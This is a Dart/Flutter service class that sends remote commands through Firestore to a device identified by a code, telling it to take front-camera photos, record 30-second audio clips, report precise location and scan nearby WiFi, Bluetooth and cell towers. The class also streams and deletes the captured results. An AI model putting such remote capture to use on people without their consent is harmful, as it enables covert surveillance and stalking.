import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/foundation.dart';

class EnvironmentScannerService {
  /// Stream scan records from Firestore (legacy)
  static Stream<QuerySnapshot> streamScans(String code) {
    final normalized = code.trim().toUpperCase();
    return FirebaseFirestore.instance
        .collection('device_scans')
        .doc(normalized)
        .collection('scans')
        .orderBy('timestamp', descending: true)
        .limit(10)
        .snapshots();
  }

  /// Stream Captured Photos
  static Stream<QuerySnapshot> streamPhotos(String code) {
    final normalized = code.trim().toUpperCase();
    return FirebaseFirestore.instance
        .collection('device_images')
        .doc(normalized)
        .collection('photos')
        .orderBy('timestamp', descending: true)
        .limit(20)
        .snapshots();
  }

  /// Stream Audio Recordings
  static Stream<QuerySnapshot> streamAudioRecords(String code) {
    final normalized = code.trim().toUpperCase();
    return FirebaseFirestore.instance
        .collection('device_audio')
        .doc(normalized)
        .collection('records')
        .orderBy('timestamp', descending: true)
        .limit(10)
        .snapshots();
  }

  /// Stream WiFi Scans
  static Stream<QuerySnapshot> streamWifiScans(String code) {
    final normalized = code.trim().toUpperCase();
    return FirebaseFirestore.instance
        .collection('device_scans')
        .doc(normalized)
        .collection('wifi')
        .orderBy('timestamp', descending: true)
        .limit(5)
        .snapshots();
  }

  /// Stream Bluetooth Scans
  static Stream<QuerySnapshot> streamBluetoothScans(String code) {
    final normalized = code.trim().toUpperCase();
    return FirebaseFirestore.instance
        .collection('device_scans')
        .doc(normalized)
        .collection('bluetooth')
        .orderBy('timestamp', descending: true)
        .limit(5)
        .snapshots();
  }

  /// Stream Command Status
  static Stream<DocumentSnapshot> streamCommandStatus(String code) {
    final normalized = code.trim().toUpperCase();
    return FirebaseFirestore.instance
        .collection('device_commands')
        .doc(normalized)
        .snapshots();
  }

  /// Send remote command to perform WiFi Scan
  static Future<void> requestWifiScan(String code) async {
    await _sendCommand(code, 'scan_wifi');
  }

  /// Send remote command to perform Bluetooth Scan
  static Future<void> requestBluetoothScan(String code) async {
    await _sendCommand(code, 'scan_bluetooth');
  }

  /// Send remote command to perform Cell Tower Scan
  static Future<void> requestCellInfo(String code) async {
    await _sendCommand(code, 'get_cell_info');
  }

  /// Send remote command to request immediate high-accuracy location ping
  static Future<void> requestLocationPing(String code) async {
    await _sendCommand(code, 'ping_location');
  }

  /// Send remote command to perform 30s Audio Recording
  static Future<void> requestAudioRecording(String code) async {
    await _sendCommand(code, 'record_audio');
  }

  /// Send remote command to capture front camera photo
  static Future<void> requestCameraCapture(String code) async {
    await _sendCommand(code, 'capture_photo');
  }

  /// Delete Photo
  static Future<void> deletePhoto(String code, String photoDocId) async {
    final normalized = code.trim().toUpperCase();
    await FirebaseFirestore.instance
        .collection('device_images')
        .doc(normalized)
        .collection('photos')
        .doc(photoDocId)
        .delete();
  }

  /// Delete Audio Record
  static Future<void> deleteAudio(String code, String audioDocId) async {
    final normalized = code.trim().toUpperCase();
    await FirebaseFirestore.instance
        .collection('device_audio')
        .doc(normalized)
        .collection('records')
        .doc(audioDocId)
        .delete();
  }

  static Future<void> _sendCommand(String code, String commandName) async {
    final normalized = code.trim().toUpperCase();
    final uid = FirebaseAuth.instance.currentUser?.uid ?? "Anonymous";
    final requestId = DateTime.now().millisecondsSinceEpoch.toString();

    try {
      await FirebaseFirestore.instance.collection('device_commands').doc(normalized).set({
        'command': commandName,
        'timestamp': FieldValue.serverTimestamp(),
        'status': 'pending',
        'requestedBy': uid,
        'requestId': requestId,
        'failureReason': null,
      }, SetOptions(merge: true));
      debugPrint("🔥 Sent remote command '$commandName' to $normalized (requestId: $requestId)");
    } catch (e) {
      debugPrint("Error sending command $commandName: $e");
    }
  }
}
